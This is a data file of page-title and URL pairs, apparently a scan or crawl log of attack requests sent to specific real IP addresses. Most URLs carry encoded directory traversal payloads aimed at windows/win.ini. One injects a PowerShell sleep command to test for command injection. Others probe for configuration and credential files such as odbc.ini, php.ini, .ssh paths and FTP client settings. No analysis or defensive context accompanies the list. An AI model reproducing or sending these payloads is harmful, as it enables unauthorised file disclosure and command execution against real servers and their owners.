ISPMan,http://210-242-148-168.hinet-ip.hinet.net/login/%255C%2522plog/ventrilo_srv.ini
Error Occurred While - Index of /mail,http://210.242.147.190/login/printer/servlet/odbc.ini
switch login,http://210.63.253.174/login1/8003/pageid%3D-3978)//%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fwindows/win.ini
porter2/full.ini at master - GitHub,https://github.com/markfullmer/porter2/blob/master/test/Datasets/full.ini
Uploader,http://203.105.228.185/loginpage/odbc.ini
Azureus,http://31.220.45.118/.ssh/Activex/flashFXP.ini
dupics,http://61.67.24.171/loginnewsletter/cgi-bin/install/preferences.ini
500 Internal Server Error,http://210.200.17.146/login/GM.cgi/admin/ventrilo_srv.ini
PHP - Login to @Mail,http://210.242.148.181/login/axis-cgi/include/))/..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af/windows/win.ini
Merak Mail Server Web Administration,http://219.84.227.163/comments/vsadmin/pages/preferences.ini
MX Control Console,http://210.200.17.190/loginok/ovcgi//.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255Cwindows/win.ini
OnLine,http://103.225.3.183/login%2522%3Bstart-sleep%2520-s%252015/ventrilo_srv.ini
Web Server Statistics for ****,http://61.64.230.171/login/axis-cgi/exchweb/bin/auth/flashFXP.ini
EXTRANET login,http://61.64.230.140/login.cgi/ovcgi/pages/ventrilo_srv.ini
actiontec,http://210.242.148.176/login/cgi-bin/ovcgi/php.ini
index.of,http://210.202.233.137/windows/win.inix5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
"\""Big",http://210.203.16.174/login_out/fcgi-bin/mt-static//..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af..%2525c0%2525af/windows/win.ini
